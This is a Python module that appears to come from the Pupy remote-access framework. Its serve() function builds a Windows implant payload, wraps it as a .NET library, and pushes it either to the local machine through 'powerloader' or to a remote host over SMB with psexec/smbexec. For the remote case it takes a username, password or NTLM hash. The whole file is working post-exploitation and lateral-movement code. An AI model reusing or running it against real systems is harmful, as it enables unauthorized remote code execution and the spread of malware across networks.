# -*- encoding: utf-8 -*-

__all__ = (
    'serve'
)

from os import unlink
from threading import Event

from pupygen import generate_binary_from_template
from pupylib.payloads.dotnet import DotNetPayload

DEFAULT_TIMEOUT = 90

def serve(
    module, payload_config, timeout=DEFAULT_TIMEOUT,
    host=None, port=445, user=None, domain=None, password=None,
    ntlm=None, execm='smbexec', arch=None):

    if arch is None:
        # Use native arch
        arch = module.client.arch

    payload, tpl, _ = generate_binary_from_template(
        module.log, payload_config, 'windows', arch=arch, shared=True
    )

    module.success(
        "Generating native payload with the current config from {} - size={}".format(
            tpl, len(payload)))

    dotnet_payload_path = DotNetPayload(
        module.log, module.client.pupsrv, payload_config, payload).gen_exe(options='-target:library')

    dotnet_payload = None

    with open(dotnet_payload_path, 'rb') as dotnet_payload_obj:
        dotnet_payload = dotnet_payload_obj.read()

    unlink(dotnet_payload_path)

    module.success("Wrapped .NET payload - size={}".format(len(dotnet_payload)))

    push_payload = None

    if host is None:
        module.client.load_package('powerloader')
        push_payload = module.client.remote('powerloader', 'push_payload', False)
    else:
        module.client.load_package('pupyutils.psexec')
        pupy_smb_exec = module.client.remote('pupyutils.psexec', 'pupy_smb_exec', False)

        def _push_payload(payload, timeout=90, log_cb=None):
            return pupy_smb_exec(
                host, port, user, domain, password, ntlm, payload,
                execm=execm, timeout=timeout, log_cb=log_cb)

        push_payload = _push_payload

    completion = Event()

    def _power_logger(result, info):
        hostinfo = ''
        if host is not None:
            hostinfo = ' ({})'.format(host)

        if result is None:
            module.info('PowerLoader{}: {}'.format(hostinfo, info))
            return

        if result is False:
            module.error('PowerLoader{}: {}'.format(hostinfo, info))
        elif result is True:
            module.success('PowerLoader{}: {}'.format(hostinfo, info))

        if completion:
            completion.set()

    cmd, pipename = push_payload(
        dotnet_payload, timeout=timeout, log_cb=_power_logger)

    module.success("PowerLoader: Serving payload to pipe={} for {} seconds".format(
        pipename, timeout))

    return cmd, completion
